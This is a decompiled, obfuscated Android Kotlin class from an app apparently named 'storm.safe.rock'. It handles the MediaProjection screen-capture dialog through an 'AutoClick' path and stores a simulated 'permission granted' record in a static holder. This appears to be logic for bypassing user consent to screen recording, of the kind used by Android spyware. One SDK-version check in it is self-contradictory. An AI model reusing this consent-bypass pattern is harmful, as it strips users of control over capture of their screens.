package com.storm.safe.rock.manager;

import android.content.Intent;
import android.os.Build;
import com.storm.safe.rock.AbstractC0241a0;
import kotlin.Pair;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.PermissionGranter$handleMediaProjectionDialog$2", m214403f = "PermissionGranter.kt", m214404l = {2085}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PermissionGranter$handleMediaProjectionDialog$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52020a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0260a2 f52021a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PermissionGranter$handleMediaProjectionDialog$2(C0260a2 c0260a2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52021a2 = c0260a2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PermissionGranter$handleMediaProjectionDialog$2(this.f52021a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((PermissionGranter$handleMediaProjectionDialog$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52020a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            this.f52020a1 = 1;
            if (b81.m210571b1(500L, this) == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
        }
        C0260a2 c0260a2 = this.f52021a2;
        int i2 = C0260a2.f52107b8;
        try {
            c0260a2.f52110a2 = false;
            c0260a2.f52119b1 = 0;
            c0260a2.f52114a6 = 0;
            c0260a2.f52118b0 = false;
            try {
                Intent intent = new Intent();
                intent.putExtra("EXTRA_MEDIA_PROJECTION_PERMISSION_GRANTED", true);
                intent.putExtra("EXTRA_PERMISSION_SOURCE", "PermissionGranter_AutoClick");
                intent.putExtra("EXTRA_TIMESTAMP", System.currentTimeMillis());
                AbstractC0241a0.f51907a1 = -1;
                AbstractC0241a0.f51908a2 = new Intent(intent);
                AbstractC0241a0.f51909a3 = System.currentTimeMillis();
                t60.m214714d6("MediaProjectionHolder", "权限数据已存储: resultCode=-1, 时间戳: " + AbstractC0241a0.f51909a3);
                Integer num = AbstractC0241a0.f51907a1;
                if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) == null) {
                    t60.m214704c5("PermissionGranter", "❌ [权限] 权限数据存储验证失败");
                }
            } catch (Exception e) {
                t60.m214705c6("PermissionGranter", "❌ [权限] 模拟权限数据存储失败", e);
            }
            int i3 = Build.VERSION.SDK_INT;
            if (i3 < 30 && i3 >= 35) {
                c0260a2.f52121b3 = true;
                AbstractC0780a0.m213692a3(c0260a2.f52125b7, null, new PermissionGranter$startSecondaryConfirmationMonitoring$1(c0260a2, null), 3);
            }
        } catch (Exception e2) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 处理MediaProjection权限获取结果失败", e2);
        }
        return C1351vv.f60710b1;
    }
}
